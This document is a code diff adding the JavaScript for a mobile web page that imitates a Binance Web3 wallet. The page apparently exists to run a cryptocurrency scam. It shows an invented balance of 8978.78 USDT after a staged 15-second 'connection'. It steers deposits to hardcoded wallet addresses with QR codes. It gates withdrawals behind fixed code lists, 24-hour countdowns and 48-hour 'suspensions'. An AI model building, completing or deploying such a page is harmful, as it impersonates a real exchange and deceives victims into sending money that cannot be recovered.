+                <svg class="w-6 h-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg>
+                <span class="text-xs">Account</span>
+            </button>
+        </footer>
+    </div>
+
+    <script>
+        // =======================================================
+        // 1. GLOBAL CONSTANTS & STATE MANAGEMENT
+        // =======================================================
+        const APP_STATE_KEY = 'binanceWeb3AppState';
+        const COINGECKO_API = 'https://api.coingecko.com/api/v3';
+        const GEMINI_API_URL = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key='; // Key intentionally left empty
+        const IMAGE_GEN_API_URL = 'https://generativelanguage.googleapis.com/v1beta/models/imagen-3.0-generate-002:predict?key=';
+        const IMAGE_MODEL = 'imagen-3.0-generate-002';
+        const VALID_WITHDRAW_CODES = ["483t21", "175064", "90h718", "63h285", "217509", "856430", "49h127", "731694", "56h8k3", "30jy17", "941g56", "12s374", "6h5b20", "203519", "48h960", "819hh2", "356h01", "740h28"];
+
+        // Initial App State Structure (will be loaded from localStorage)
+        let appState = {
+            isConnected: false,
+            userID: '',
+            walletAddress: '0x97fe2864e38d0a667fc4daf9b2a4ed3e97ca1168',
+            balances: {
+                totalUSD: 0.00,
+                tradeUSD: 0.00,
+                lastKnownTotalUSD: 0.00, // For calculating change percentage
+            },
+            heldTokens: [
+                // { symbol: 'USDT', id: 'tether', image: '...', balance: 8978.78 }
+            ],
+            activities: [], // Transaction and status updates
+            currentPage: 'home',
+            withdrawalCountdownEnd: 0, // Timestamp for 24-hour countdown end
+            withdrawalSuspensionEnd: 0, // Timestamp for 48-hour suspension end
+            withdrawalAttempts: 0,
+            notificationOn: true,
+            lastNotificationTime: 0, // Timestamp for last daily banner display
+            depositAttempts: {}, // { code: lastUsedTimestamp }
+            withdrawalAttempts: {} // { code: lastUsedTimestamp }
+        };
+
+        // Cache for Hot Coins
+        let hotCoinsCache = [];
+
+        /**
+         * Loads state from localStorage or initializes default state.
+         */
+        function loadState() {
+            const savedState = localStorage.getItem(APP_STATE_KEY);
+            if (savedState) {
+                const loaded = JSON.parse(savedState);
+                // Merge loaded state with defaults to ensure all keys exist
+                appState = { ...appState, ...loaded };
+
+                // Handle token data which might be missing live price/image
+                if (appState.heldTokens.length > 0 && !appState.heldTokens[0].image) {
+                     // Default USDT token if not loaded correctly
+                    if (appState.heldTokens.length === 1 && appState.heldTokens[0].symbol === 'USDT') {
+                        appState.heldTokens[0].image = 'https://assets.coingecko.com/coins/images/325/small/Tether-logo.png?1598003707';
+                        appState.heldTokens[0].id = 'tether';
+                    }
+                }
+
+                console.log("State loaded:", appState);
+            } else {
+                console.log("No state found, initializing new state.");
+                appState.userID = '9437137866';
+            }
+        }
+
+        /**
+         * Saves current app state to localStorage.
+         */
+        function saveState() {
+            localStorage.setItem(APP_STATE_KEY, JSON.stringify(appState));
+        }
+
+        /**
+         * Utility function for simulating async operations.
+         */
+        function waitFor(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        /**
+         * Utility function to show error/success message in a modal.
+         */
+        function showMessage(title, message, type = 'info', addTokenInfo = null) {
+            const modal = document.getElementById('dailyPopUpNotification');
+            const modalTitle = document.getElementById('dailyPopUpTitle');
+            const modalMessage = document.getElementById('dailyPopUpBody');
+            const addTokenBtn = document.getElementById('dailyPopUpAddTokenBtn');
+
+            modalTitle.textContent = title;
+            modalMessage.innerHTML = message;
+            modalTitle.className = `text-xl font-bold ${type === 'error' ? 'text-danger' : type === 'success' ? 'text-success' : 'text-yellow-400'}`;
+
+            addTokenBtn.onclick = () => {
+                if (addTokenInfo) {
+                    addSelectedTokenToHoldings(addTokenInfo);
+                }
+                hideModal('dailyPopUpNotification');
+            };
+
+            if (addTokenInfo) {
+                addTokenBtn.classList.remove('hidden');
+            } else {
+                addTokenBtn.classList.add('hidden');
+            }
+
+            modal.classList.remove('hidden', 'items-end');
+            modal.classList.add('flex', 'items-center');
+            document.querySelector('#dailyPopUpNotification .modal-content').classList.remove('translate-y-full');
+        }
+
+        /**
+         * General modal/popup handler.
+         */
+        function showModal(title, message) {
+            document.getElementById('modalTitle').textContent = title;
+            document.getElementById('modalMessage').textContent = message;
+            document.getElementById('globalModal').classList.remove('hidden');
+            document.getElementById('globalModal').classList.add('flex');
+        }
+
+        function hideModal(id) {
+            const modal = document.getElementById(id);
+            if (modal) {
+                modal.classList.remove('flex');
+                modal.classList.add('hidden');
+                // For bottom modals like withdrawalSelector, reset transform
+                if (id === 'withdrawalSelector') {
+                    document.querySelector(`#${id} .modal-content`).classList.add('translate-y-full');
+                }
+            }
+        }
+
+        function showLoading(message) {
+            document.getElementById('loadingMessage').textContent = message;
+            document.getElementById('globalLoading').classList.remove('hidden');
+            document.getElementById('globalLoading').classList.add('flex');
+        }
+
+        function hideLoading() {
+            document.getElementById('globalLoading').classList.remove('flex');
+            document.getElementById('globalLoading').classList.add('hidden');
+        }
+
+        // =======================================================
+        // 2. NAVIGATION & UI UPDATES
+        // =======================================================
+
+        /**
+         * Handles page navigation and updates footer/header.
+         */
+        function showPage(pageId) {
+            if (pageId === 'home' && appState.currentPage === 'withdrawalDetailsPage' && isSuspended()) {
+                // If suspended, allow going home but keep suspension warning active
+            } else if (pageId !== 'home' && isSuspended()) {
+                showMessage('Access Denied', 'Withdrawal is suspended for 48 hours due to too many failed attempts.', 'error');
+                return;
+            }
+
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => page.classList.add('hidden'));
+
+            // Show the requested page
+            const page = document.getElementById(pageId);
+            if (page) {
+                page.classList.remove('hidden');
+                appState.currentPage = pageId;
+            } else {
+                console.error(`Page ID '${pageId}' not found.`);
+                return;
+            }
+
+            // Update Header Title
+            const titleMap = {
+                'home': '',
+                'market': 'Market',
+                'trade': 'Trade',
+                'account': 'Account',
+                'notification': 'Notifications',
+                'search': 'Search',
+                'chat': 'Support Chat',
+                'withdrawalDetailsPage': 'Withdrawal',
+                'withdrawalConfirmationPage': 'Withdrawal',
+                'withdrawalProcessingPage': 'Withdrawal',
+                'depositCoinSelectionPage': 'Select Coin',
+                'depositNetworkPage': 'Select Network',
+                'depositAddressPage': 'Deposit Address',
+                'depositConfirmPage': 'Confirm Deposit',
+                'accountDetails': 'Account Details',
+                'googleAuthVerification': 'Secure Account',
+            };
+            document.getElementById('pageTitle').textContent = titleMap[pageId] || 'Binance';
+
+            // Update Footer Nav
+            document.querySelectorAll('.footer-nav .nav-item').forEach(item => {
+                item.classList.remove('active');
+                if (item.getAttribute('data-page') === pageId) {
+                    item.classList.add('active');
+                }
+            });
+
+            // Specific page initialization
+            if (pageId === 'home') updateHomeDashboard();
+            if (pageId === 'market') loadMarketData();
+            if (pageId === 'trade') initTradingView('tradeChartContainer', 'BTCUSDT');
+            if (pageId === 'account') updateAccountPage();
+            if (pageId === 'notification') updateNotificationPage();
+            if (pageId === 'depositCoinSelectionPage') loadDepositCoins();
+            if (pageId === 'search') document.getElementById('globalSearchInput').value = '';
+            if (pageId === 'accountDetails') updateAccountDetailsPage();
+            if (pageId === 'googleAuthVerification') updateGoogleAuthPage();
+
+            saveState(); // Persist current page
+
+            // Ensure we stay on the correct withdrawal page if one is active
+            if (appState.withdrawalCountdownEnd > Date.now()) {
+                if (pageId !== 'withdrawalProcessingPage') {
+                    // Force redirect back to processing page if countdown is active
+                    showPage('withdrawalProcessingPage');
+                }
+            } else if (isSuspended()) {
+                 if (pageId === 'withdrawalDetailsPage') {
+                    document.getElementById('withdrawalDetailsPage').classList.remove('hidden');
+                    document.getElementById('suspensionWarning').classList.remove('hidden');
+                }
+            }
+
+            // If the user is navigating away from a form, clear errors
+            if (pageId !== 'withdrawalConfirmationPage') document.getElementById('withdrawalCodeError').classList.add('hidden');
+            if (pageId !== 'depositConfirmPage') document.getElementById('depositCodeError').classList.add('hidden');
+        }
+
+        /**
+         * Updates all dynamic UI elements on the homepage.
+         */
+        async function updateUI() {
+            // Header Button
+            const connectBtn = document.getElementById('connectWalletBtn');
+            connectBtn.textContent = appState.isConnected ? 'Connected' : 'Connect Wallet';
+            connectBtn.className = `text-sm px-3 py-1 rounded-full font-medium transition-all duration-300 ${appState.isConnected ? 'bg-success text-white' : 'bg-yellow-400 text-black'}`;
+
+            // Homepage UI
+            document.getElementById('userIDDisplay').textContent = appState.isConnected ? appState.userID : '---';
+
+            // Total Balance
+            const totalBalance = appState.balances.totalUSD.toFixed(2);
+            document.getElementById('totalBalanceDisplay').innerHTML = `
+                <span class="text-text">$${appState.isConnected ? totalBalance : '0.00'}</span>
+                <span id="balanceChange" class="text-sm ml-2 ${appState.balances.tradeUSD >= appState.balances.lastKnownTotalUSD ? 'text-success' : 'text-danger'}">
+                    ${appState.isConnected ? ((appState.balances.totalUSD - appState.balances.lastKnownTotalUSD) / appState.balances.lastKnownTotalUSD * 100).toFixed(2) + '%' : ''}
+                </span>
+            `;
+
+            // Holdings List
+            renderHoldings();
+
+            // Activity Section
+            renderActivitySection();
+
+            // Update all page-specific UI fields
+            updateAccountPage();
+            updateAccountDetailsPage();
+        }
+
+        /**
+         * Renders the Holdings section on the homepage.
+         */
+        async function renderHoldings() {
+            const holdingsList = document.getElementById('holdingsList');
+            if (!appState.isConnected || appState.heldTokens.length === 0) {
+                holdingsList.innerHTML = `<p class="text-muted text-sm text-center py-4">Connect wallet to see holdings.</p>`;
+                return;
+            }
+
+            let html = '';
+            try {
+                // Fetch live prices for held tokens
+                const ids = appState.heldTokens.map(t => t.id).join(',');
+                const response = await fetch(`${COINGECKO_API}/simple/price?ids=${ids}&vs_currencies=usd`);
+                if (!response.ok) throw new Error('Failed to fetch token prices.');
+                const prices = await response.json();
+
+                appState.heldTokens.forEach(token => {
+                    const priceData = prices[token.id];
+                    const currentPrice = priceData ? priceData.usd : 'N/A';
+                    const value = token.balance * (currentPrice === 'N/A' ? 1 : currentPrice);
+
+                    html += `
+                        <div class="flex items-center justify-between bg-surface p-3 rounded-lg border border-gray-800">
+                            <div class="flex items-center space-x-3">
+                                <img src="${token.image}" onerror="this.onerror=null;this.src='https://placehold.co/32x32/1f2937/ffffff?text=${token.symbol.substring(0,2).toUpperCase()}'" class="w-8 h-8 rounded-full" />
+                                <div>
+                                    <p class="font-semibold">${token.symbol.toUpperCase()}</p>
+                                    <p class="text-xs text-muted">$${currentPrice !== 'N/A' ? currentPrice.toFixed(4) : 'N/A'} USD</p>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <p class="font-semibold">$${value.toFixed(2)}</p>
+                                <p class="text-xs text-muted">${token.balance.toFixed(4)} ${token.symbol.toUpperCase()}</p>
+                            </div>
+                        </div>
+                    `;
+                });
+            } catch (e) {
+                console.error('Error fetching token prices:', e);
+                html = `<p class="text-danger text-sm text-center py-4">Error loading live token data. ${appState.heldTokens.map(t => `$${t.balance.toFixed(2)} ${t.symbol.toUpperCase()}`).join(', ')}</p>`;
+            }
+
+            holdingsList.innerHTML = html;
+        }
+
+        /**
+         * Renders the Transactions & Activity section.
+         */
+        function renderActivitySection() {
+            const activitySection = document.getElementById('activitySection');
+            if (!appState.isConnected) {
+                activitySection.innerHTML = `<p class="text-sm text-muted text-center">No recent activity.</p>`;
+                return;
+            }
+
+            let html = '';
+            const now = Date.now();
+
+            // 1. Withdrawal Countdown Status
+            if (appState.withdrawalCountdownEnd > now) {
+                const remaining = appState.withdrawalCountdownEnd - now;
+                const time = formatTime(remaining);
+                html += `
+                    <div class="bg-yellow-900/30 p-3 rounded-lg border border-yellow-700 text-sm">
+                        <p class="font-semibold text-yellow-400">Withdrawal Processing</p>
+                        <p class="text-xs text-muted">Amount: ${appState.activities.find(a => a.type === 'Withdrawal' && a.status === 'Processing')?.amount || '---'} USD</p>
+                        <p class="text-xs text-muted">Time Remaining: <span id="activityCountdown">${time}</span></p>
+                    </div>
+                `;
+            } else if (appState.withdrawalCountdownEnd > 0) {
+                 // Withdrawal Successful (and not yet recorded as a successful activity)
+                 const processingActivityIndex = appState.activities.findIndex(a => a.type === 'Withdrawal' && a.status === 'Processing');
+                 if (processingActivityIndex !== -1) {
+                     const procActivity = appState.activities[processingActivityIndex];
+                     appState.activities[processingActivityIndex] = { ...procActivity, status: 'Success' };
+                     appState.withdrawalCountdownEnd = 0; // Reset countdown
+                     saveState();
+                     showMessage('Withdrawal Successful!', `The withdrawal of $${procActivity.amount.toFixed(2)} USD has been successfully processed.`, 'success');
+                 }
+            }
+
+            // 2. Withdrawal Suspension Status
+            if (isSuspended()) {
+                const remaining = appState.withdrawalSuspensionEnd - now;
+                const time = formatTime(remaining);
+                html += `
+                    <div class="bg-danger/30 p-3 rounded-lg border border-danger text-sm">
+                        <p class="font-semibold text-danger">Withdrawal Suspended (48h)</p>
+                        <p class="text-xs text-muted">Withdrawal functions are locked due to failed attempts.</p>
+                        <p class="text-xs text-muted">Time Remaining: <span id="suspensionActivityCountdown">${time}</span></p>
+                    </div>
+                `;
+            } else if (appState.withdrawalSuspensionEnd > 0) {
+                appState.withdrawalSuspensionEnd = 0; // Reset suspension
+                saveState();
+            }
+
+            // 3. Activity Log
+            appState.activities.sort((a, b) => new Date(b.date) - new Date(a.date));
+            const activityHtml = appState.activities.map(a => {
+                const color = a.status === 'Success' ? 'text-success' : a.status === 'Failed' || a.status === 'Suspended' ? 'text-danger' : 'text-yellow-400';
+                return `
+                    <div class="flex justify-between items-center text-sm">
+                        <div>
+                            <p class="font-medium">${a.type}</p>
+                            <p class="text-xs text-muted">${new Date(a.date).toLocaleDateString()}</p>
+                        </div>
+                        <p class="${color} font-semibold">${a.status}</p>
+                    </div>
+                `;
+            }).join('');
+
+            html += activityHtml || `<p class="text-sm text-muted text-center">No recent activity.</p>`;
+            activitySection.innerHTML = html;
+        }
+
+        // =======================================================
+        // 3. CORE LOGIC (CONNECTION & COUNTDOWN)
+        // =======================================================
+
+        /**
+         * Connect/Disconnect Wallet
+         */
+        async function toggleWalletConnection() {
+            if (appState.isConnected) {
+                // Disconnect logic
+                appState.isConnected = false;
+                appState.balances.totalUSD = 0.00;
+                appState.balances.lastKnownTotalUSD = 0.00;
+                appState.heldTokens = [];
+                appState.activities = [];
+                appState.currentPage = 'home';
+                appState.withdrawalCountdownEnd = 0;
+                appState.withdrawalSuspensionEnd = 0;
+                showMessage('Wallet Disconnected', 'You have successfully disconnected your Web3 Wallet.', 'info');
+                saveState();
+                updateUI();
+                showPage('home');
+                return;
+            }
+
+            // Connect logic
+            showLoading('Connecting Web3 Wallet...');
+            await waitFor(15000); // 15-second connection delay
+
+            // Check if already connected during the delay (user might have refreshed)
+            if (appState.isConnected) {
+                hideLoading();
+                showMessage('Already Connected', 'Wallet is already connected and state is persistent.', 'info');
+                return;
+            }
+
+            appState.isConnected = true;
+            appState.balances.lastKnownTotalUSD = 0.00; // Reset for percentage calc on first connection
+            appState.balances.totalUSD = 8978.78;
+            appState.heldTokens = [
+                { symbol: 'USDT', id: 'tether', image: 'https://assets.coingecko.com/coins/images/325/small/Tether-logo.png?1598003707', balance: 8978.78 }
+            ];
+
+            saveState();
+            updateUI();
+            hideLoading();
+            showMessage('Connection Successful!', 'Your wallet is now connected. Your Account ID has been generated. Don\'t forget to use the **Save Account** button in the notification pop-up.', 'success');
+        }
+
+        /**
+         * Countdown functions (Withdrawal and Suspension).
+         */
+        function formatTime(ms) {
+            const totalSeconds = Math.floor(ms / 1000);
+            const hours = Math.floor(totalSeconds / 3600);
+            const minutes = Math.floor((totalSeconds % 3600) / 60);
+            const seconds = totalSeconds % 60;
+            return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        }
+
+        function isSuspended() {
+            return appState.withdrawalSuspensionEnd > Date.now();
+        }
+
+        function checkCountdownAndSuspension() {
+            const now = Date.now();
+
+            // Check Withdrawal Countdown
+            if (appState.withdrawalCountdownEnd > now) {
+                const remaining = appState.withdrawalCountdownEnd - now;
+                const time = formatTime(remaining);
+                const procCountdown = document.getElementById('processingCountdown');
+                const activityCountdown = document.getElementById('activityCountdown');
+
+                if (procCountdown) procCountdown.textContent = time;
+                if (activityCountdown) activityCountdown.textContent = time;
+
+                // Ensure processing page is shown if countdown is active
+                if (appState.currentPage !== 'withdrawalProcessingPage') {
+                    // Check if the user is on a main page or if they refreshed
+                    const onMainPage = ['home', 'market', 'trade', 'account'].includes(appState.currentPage);
+                    if (onMainPage) {
+                        renderActivitySection(); // Update activity for homepage persistence
+                    } else if (document.getElementById(appState.currentPage).classList.contains('hidden')) {
+                        // If the user refreshed and a non-main page was active, force to processing page
+                        showPage('withdrawalProcessingPage');
+                    }
+                }
+
+            } else if (appState.withdrawalCountdownEnd > 0) {
+                // Countdown finished!
+                appState.balances.lastKnownTotalUSD = appState.balances.totalUSD; // Prepare for percentage calculation
+                const processingActivityIndex = appState.activities.findIndex(a => a.type === 'Withdrawal' && a.status === 'Processing');
+                let withdrawnAmount = 0;
+
+                if (processingActivityIndex !== -1) {
+                    const procActivity = appState.activities[processingActivityIndex];
+                    withdrawnAmount = procActivity.amount;
+                    appState.activities[processingActivityIndex] = { ...procActivity, status: 'Success', date: new Date().toISOString() };
+                    appState.balances.totalUSD -= withdrawnAmount; // Deduct amount
+                }
+
+                appState.withdrawalCountdownEnd = 0;
+                saveState();
+                updateUI();
+                showMessage('Withdrawal Successful!', `The withdrawal of $${withdrawnAmount.toFixed(2)} USD has been successfully processed and deducted from your balance.`, 'success');
+                renderActivitySection(); // Rerender activity without countdown
+            }
+
+            // Check Suspension Countdown
+            if (appState.withdrawalSuspensionEnd > now) {
+                const remaining = appState.withdrawalSuspensionEnd - now;
+                const time = formatTime(remaining);
+                const suspensionActivityCountdown = document.getElementById('suspensionActivityCountdown');
+                if (suspensionActivityCountdown) suspensionActivityCountdown.textContent = time;
+
+                const suspensionWarning = document.getElementById('suspensionWarning');
+                if (appState.currentPage === 'withdrawalDetailsPage' && suspensionWarning) {
+                    suspensionWarning.classList.remove('hidden');
+                }
+                renderActivitySection(); // Update activity section with suspension status
+            } else if (appState.withdrawalSuspensionEnd > 0) {
+                // Suspension finished!
+                appState.withdrawalSuspensionEnd = 0;
+                appState.withdrawalAttempts = 0;
+                saveState();
+                updateUI();
+                const suspensionWarning = document.getElementById('suspensionWarning');
+                if (suspensionWarning) suspensionWarning.classList.add('hidden');
+                showMessage('Suspension Lifted', 'Your withdrawal functions have been restored. Please proceed with caution.', 'success');
+            }
+        }
+
+        // =======================================================
+        // 4. DEPOSIT LOGIC (Fully Updated & Working)
+        // =======================================================
+        let selectedDepositCoin = null;
+        let currentDeposit = {};
+        let allCoins = [];
+        const DEPOSIT_CODES = ["4k2915", "93y472", "158i03", "7649k1", "50u319", "847l61", "31k586", "672h50", "24j391", "9y5836", "73a258", "62h047", "580y24", "417i02", "89h351", "264h98", "152j83", "309u72", "741o26", "58u320", "62w583", "958j10", "203i74", "7429u5", "894j21", "510f93", "6734o0", "248h65", "90c632", "43j892"];
+        const DEPOSIT_NETWORKS = {
+            USDT: ['Ethereum', 'Tron', 'BSC'],
+            BTC: ['Bitcoin'],
+            ETH: ['Ethereum'],
+            BNB: ['BNB Smart Chain'],
+            TRX: ['Tron']
+        };
+        const DEPOSIT_ADDRESSES = {
+            'ETHEREUM': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
+            'TRON': 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco',
+            'BSC': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
+            'BITCOIN': 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu'
+        };
+
+        function openDepositCoinSelection() {
+             if (!appState.isConnected) {
+                showMessage('Wallet Required', 'Please connect your Web3 Wallet to perform a deposit.', 'error');
+                return;
+            }
+            showPage('depositCoinSelectionPage');
+        }
+
+        async function loadDepositCoins() {
+            const depositCoinList = document.getElementById('depositCoinList');
+            if (!depositCoinList) return;
+            depositCoinList.innerHTML = `<p class="text-center text-gray-400 py-4">Loading coins...</p>`;
+            try {
+                if (allCoins.length === 0) {
+                    const response = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=200&page=1&sparkline=false`);
+                    if (!response.ok) throw new Error('Failed to fetch deposit coins');
+                    allCoins = await response.json();
+                }
+                allCoins.sort((a, b) => a.symbol.localeCompare(b.symbol)); // Sort A–Z
+                renderDepositCoinList(allCoins);
+            } catch (error) {
+                console.error("Error loading deposit coins:", error);
+                depositCoinList.innerHTML = `<p class="text-center text-danger py-4">Failed to load coins. Please try again later.</p>`;
+            }
+
+            const searchInput = document.getElementById('depositSearch');
+            if (searchInput) {
+                searchInput.oninput = (e) => {
+                    const searchTerm = e.target.value.trim().toLowerCase();
+                    if (!searchTerm) {
+                        renderDepositCoinList(allCoins);
+                        return;
+                    }
+                    const filtered = allCoins.filter(
+                        c => c.name.toLowerCase().includes(searchTerm) || c.symbol.toLowerCase().includes(searchTerm)
+                    );
+                    renderDepositCoinList(filtered);
+                };
+            }
+        }
+
+        function renderDepositCoinList(coins) {
+            const container = document.getElementById('depositCoinList');
+            if (!container) return;
+
+            if (!coins || coins.length === 0) {
+                container.innerHTML = `<p class="text-center text-gray-400 py-4">No matching coins found.</p>`;
+                return;
+            }
+
+            let html = '';
+            coins.forEach(coin => {
+                html += `
+                    <div class="deposit-coin-item flex items-center justify-between p-3 bg-gray-900 rounded-lg border border-gray-800 hover:bg-gray-800 cursor-pointer"
+                        data-symbol="${coin.symbol.toUpperCase()}"
+                        data-name="${coin.name}"
+                        data-id="${coin.id}"
+                        data-image="${coin.image}">
+                        <div class="flex items-center gap-3">
+                            <img src="${coin.image}" class="w-8 h-8 rounded-full"
+                                onerror="this.onerror=null;this.src='https://placehold.co/32x32/1f2937/ffffff?text=${coin.symbol.substring(0,2).toUpperCase()}'" />
+                            <div>
+                                <p class="font-semibold">${coin.symbol.toUpperCase()}</p>
+                                <p class="text-xs text-gray-400">${coin.name}</p>
+                            </div>
+                        </div>
+                        <svg class="w-5 h-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 5l7 7-7 7" />
+                        </svg>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+
+            document.querySelectorAll('.deposit-coin-item').forEach(item => {
+                item.onclick = () => {
+                    const symbol = item.dataset.symbol;
+                    const image = item.dataset.image;
+                    const id = item.dataset.id;
+                    selectDepositCoin(symbol, image, id);
+                };
+            });
+        }
+
+        function selectDepositCoin(symbol, image, id) {
+            selectedDepositCoin = { symbol, image, id };
+            document.getElementById('depositCoinName').textContent = symbol;
+            renderNetworkSelection(symbol);
+            showPage('depositNetworkPage');
+        }
+
+        function renderNetworkSelection(coinSymbol) {
+            const container = document.getElementById('networkSelectionList');
+            if (!container) return;
+
+            const networks = DEPOSIT_NETWORKS[coinSymbol] || (coinSymbol === 'USDT' ? DEPOSIT_NETWORKS['USDT'] : ['Ethereum']);
+            container.innerHTML = networks.map(network => `
+                <button class="network-select-btn w-full flex items-center py-4 px-5 bg-gray-900 border border-gray-700 rounded-xl hover:bg-gray-800 transition"
+                        data-network="${network}">
+                    <span class="text-md font-semibold">${network}</span>
+                    <svg class="w-5 h-5 ml-auto text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="none"
+                        viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 5l7 7-7 7" />
+                    </svg>
+                </button>
+            `).join('');
+
+            document.querySelectorAll('.network-select-btn').forEach(btn => {
+                btn.onclick = () => {
+                    const network = btn.dataset.network;
+                    openDepositAddressPage(selectedDepositCoin.symbol, network);
+                };
+            });
+        }
+
+        function openDepositAddressPage(symbol, network) {
+            const networkKey = network.replace(/ /g, '').toUpperCase();
+            const address = DEPOSIT_ADDRESSES[networkKey];
+
+            if (!address) {
+                showMessage('Error', `No deposit address found for ${symbol} on ${network}.`, 'error');
+                return;
+            }
+
+            currentDeposit = { coin: symbol, network, address, id: selectedDepositCoin.id, image: selectedDepositCoin.image };
+
+            document.getElementById('depositNetworkHeader').textContent = network;
+            document.getElementById('depositAddressDisplay').textContent = address;
+            document.getElementById('depositAddressCoinSymbol').textContent = symbol;
+
+            const qrContainer = document.getElementById('qrcode');
+            qrContainer.innerHTML = '';
+            new QRCode(qrContainer, {
+                text: address,
+                width: 160,
+                height: 160,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+
+            // Prepare for next step, using deposit confirm page for amount input
+            const depositAmountInput = document.createElement('input');
+            depositAmountInput.type = 'number';
+            depositAmountInput.id = 'depositAmountInput';
+            depositAmountInput.placeholder = `Enter amount of ${symbol} to deposit...`;
+            depositAmountInput.className = 'w-full p-3 rounded-lg bg-card border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text mt-4';
+
+            const depositNextBtn = document.createElement('button');
+            depositNextBtn.textContent = 'Next';
+            depositNextBtn.className = 'w-full btn-primary mt-4';
+            depositNextBtn.onclick = showDepositConfirmationPage;
+
+            // Simple hack to repurpose the address page for amount input before confirmation
+            const depositAddressPage = document.getElementById('depositAddressPage');
+            const existingInput = document.getElementById('depositAmountInput');
+            const existingBtn = document.getElementById('depositNextBtn');
+            if (existingInput) existingInput.remove();
+            if (existingBtn) existingBtn.remove();
+            depositAddressPage.append(depositAmountInput, depositNextBtn);
+
+            showPage('depositAddressPage');
+        }
+
+        function copyDepositAddress() {
+            const address = document.getElementById('depositAddressDisplay').textContent;
+            if (!address) return;
+
+            document.execCommand('copy'); // Fallback copy mechanism
+            showMessage('Copied!', 'Address copied to clipboard successfully.', 'info');
+        }
+
+        function showDepositConfirmationPage() {
+            const input = document.getElementById('depositAmountInput');
+            const amount = parseFloat(input.value);
+
+            if (isNaN(amount) || amount <= 0) {
+                showMessage('Error', 'Please enter a valid deposit amount.', 'error');
+                return;
+            }
+            currentDeposit.amount = amount;
+
+            document.getElementById('depositConfirmAmount').textContent = amount.toFixed(2);
+            document.getElementById('depositVerificationCode').value = '';
+            document.getElementById('depositCodeError').classList.add('hidden');
+            showPage('depositConfirmPage');
+        }
+
+        async function handleDepositConfirmation() {
+            const codeInput = document.getElementById('depositVerificationCode');
+            const code = codeInput.value.trim();
+            const errorMsg = document.getElementById('depositCodeError');
+
+            if (!code) {
+                errorMsg.textContent = 'Enter your verification code.';
+                errorMsg.classList.remove('hidden');
+                return;
+            }
+
+            errorMsg.classList.add('hidden');
+            showLoading('Processing deposit...');
+            await waitFor(15000);
+
+            const now = Date.now();
+
+            // Check if code is already used (simulated)
+            const lastUsed = appState.depositAttempts[code];
+            if (lastUsed && now - lastUsed < (24 * 60 * 60 * 1000) * 2) { // Allow 2 uses per 48 hours for simulation
+                hideLoading();
+                errorMsg.textContent = 'This code has already been used within the last 48 hours.';
+                errorMsg.classList.remove('hidden');
+                return;
+            }
+
+            if (!DEPOSIT_CODES.includes(code)) {
+                hideLoading();
+                errorMsg.textContent = 'Invalid verification code.';
+                errorMsg.classList.remove('hidden');
+                return;
+            }
+
+            // Success logic
+            appState.depositAttempts[code] = now; // Mark code as used
+            appState.balances.lastKnownTotalUSD = appState.balances.totalUSD;
+            appState.balances.totalUSD += currentDeposit.amount;
+
+            // Add/update token balance
+            const existingTokenIndex = appState.heldTokens.findIndex(t => t.symbol === currentDeposit.coin);
+            if (existingTokenIndex !== -1) {
+                appState.heldTokens[existingTokenIndex].balance += currentDeposit.amount;
+            } else {
+                appState.heldTokens.push({
+                    symbol: currentDeposit.coin,
+                    id: currentDeposit.id,
+                    image: currentDeposit.image,
+                    balance: currentDeposit.amount
+                });
+            }
+
+            appState.activities.unshift({
+                type: 'Deposit',
+                desc: `Deposited ${currentDeposit.amount.toFixed(2)} ${currentDeposit.coin} via ${currentDeposit.network}.`,
+                date: new Date().toISOString(),
+                status: 'Success',
+                amount: currentDeposit.amount
+            });
+
+            saveState();
+            hideLoading();
+            updateUI();
+
+            // Show success modal with Add Token button (though token is already added/updated)
+            showMessage('Deposit Successful', `Successfully deposited ${currentDeposit.amount.toFixed(2)} ${currentDeposit.coin}. The token has been added to your holdings.`, 'success');
+            showPage('home');
+        }
+
+        // =======================================================
+        // 5. WITHDRAWAL LOGIC (Fully Updated & Working)
+        // =======================================================
+        let currentWithdrawal = { address: '', network: '', amount: 0, coin: 'USDT' };
+
+        function showWithdrawalSelector() {
+            if (!appState.isConnected) {
+                showMessage('Wallet Required', 'Please connect your Web3 Wallet to perform a withdrawal.', 'error');
+                return;
+            }
+            if (isSuspended()) {
+                showMessage('Withdrawal Suspended', `Withdrawal functions are locked. Remaining time: ${formatTime(appState.withdrawalSuspensionEnd - Date.now())}`, 'error');
+                return;
+            }
+            document.getElementById('withdrawalSelector').classList.remove('hidden');
+            document.querySelector('#withdrawalSelector .modal-content').classList.remove('translate-y-full');
+            document.querySelector('#withdrawalSelector .modal-content').classList.add('translate-y-0');
+        }
+
+        function showWithdrawalDetailsPage() {
+            hideModal('withdrawalSelector');
+            document.getElementById('suspensionWarning').classList.add('hidden'); // Hide suspension warning initially
+            if (isSuspended()) {
+                 document.getElementById('suspensionWarning').classList.remove('hidden');
+                 document.getElementById('withdrawBtn').disabled = true;
+            } else {
+                 document.getElementById('withdrawBtn').disabled = false;
+            }
+            showPage('withdrawalDetailsPage');
+        }
+
+        function fillFromConnectedWallet() {
